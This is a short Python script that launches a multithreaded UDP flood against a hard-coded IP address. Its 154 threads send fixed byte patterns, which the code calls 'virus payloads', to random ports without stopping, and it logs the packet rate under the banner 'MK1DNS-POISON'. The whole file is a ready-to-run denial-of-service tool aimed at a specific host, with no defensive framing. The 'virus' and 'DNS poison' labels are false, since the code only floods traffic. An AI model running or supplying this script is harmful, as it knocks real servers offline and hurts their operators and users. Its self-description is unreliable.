import socket
import threading
import time
import random

target = "62.109.121.43"
MIN_THREADS = 154

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

# Virus payloads
VIRUS_PAYLOADS = [
    b'\xDE\xAD\xBE\xEF' * 16,  # Memory eater
    b'\x00' * 64,  # Null virus
    b'\xFF' * 48,  # Max byte virus
    b'\xAA\x55\xCC\x33' * 12,  # Alternating virus
    b'\x80' * 56,  # High bit virus
    b'\x7F' * 60,  # Max positive virus
    random.randbytes(64),  # Random virus
]

# Stats
total_packets = 0
start_time = time.time()

# Virus UDP attack
def virus_attack(thread_id):
    global total_packets
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        try:
            # Fast small virus payload
            payload = random.choice(VIRUS_PAYLOADS)
            port = random.randint(1, 65535)
            
            # SEND VIRUS
            sock.sendto(payload, (target, port))
            total_packets += 1
            
        except:
            # Recreate socket if broken
            try:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass

# Launch threads
print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
print(f"{GREEN}Starting {MIN_THREADS} virus threads...{RESET}")

for i in range(MIN_THREADS):
    t = threading.Thread(target=virus_attack, args=(i,))
    t.daemon = True
    t.start()

# Simple logging
while True:
    time.sleep(1)
    elapsed = time.time() - start_time
    pps = int(total_packets / elapsed) if elapsed > 0 else 0
    
    print(f"{RED}MK1DNS-POISON{RESET}:{GREEN}{pps}/s{RESET}")
    
    # Reset every minute
    if elapsed >= 60:
        total_packets = 0
        start_time = time.time()
